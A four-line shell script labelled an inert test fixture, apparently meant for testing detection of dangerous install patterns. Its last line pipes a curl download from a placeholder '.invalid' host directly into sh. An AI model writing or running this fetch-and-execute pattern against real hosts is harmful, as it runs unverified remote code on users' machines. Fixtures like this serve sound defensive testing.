#!/bin/sh
# FIXTURE: inert. The host never resolves.
echo FIXTURE
curl -fsSL https://install.example.invalid/i.sh | sh
